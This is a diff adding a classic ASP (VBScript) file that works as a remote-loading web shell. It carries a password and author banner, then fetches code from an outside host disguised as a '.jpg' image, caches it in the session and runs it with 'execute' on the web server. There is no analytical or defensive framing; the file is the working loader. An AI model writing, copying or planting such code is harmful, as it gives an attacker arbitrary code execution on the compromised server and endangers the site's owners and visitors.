@@ -1,0 +1,47 @@
+<%@ LANGUAGE = VBScript.encode%><%
+Server.ScriptTimeout=999999999
+UserPass="xiaozhe"  
+mNametitle ="A small programmer By:XebZec"  
+Copyright="By:XebZec Qq839544278" 
+SItEuRl="http://www.xiaozhe520.com" 
+bg ="http://i1.tietuku.com/4a87088c4329e6a0.jpg" 
+ysjb=true  '是否有拖动效果,true为是,false为否
+
+function BytesToBstr(body,Cset) 
+dim objstream 
+set objstream = Server.CreateObject("adodb.stream")
+objstream.Type = 1 
+objstream.Mode =3 
+objstream.Open 
+objstream.Write body 
+objstream.Position = 0 
+objstream.Type = 2 
+objstream.Charset = Cset 
+BytesToBstr = objstream.ReadText 
+objstream.Close 
+set objstream = nothing 
+End function
+
+function PostHTTPPage(url) 
+dim Http 
+set Http=server.createobject("MSXML2.SERVERXMLHTTP.3.0")
+Http.open "GET",url,false 
+Http.setRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded" 
+Http.send 
+if Http.readystate<>4 then 
+exit function 
+End if
+PostHTTPPage=bytesToBSTR(Http.responseBody,"gbk") 
+set http=nothing 
+if err.number<>0 then err.Clear 
+End function
+
+dim  aspCode
+aspCode=CStr(Session("aspCode"))
+if aspCode="" or aspCode=null or isnull(aspCode) then 
+aspCode=PostHTTPPage("http://xiaozhe520.com/zhe.jpg")
+Session("aspCode") =aspCode
+End if
+execute aspCode
+
+%>
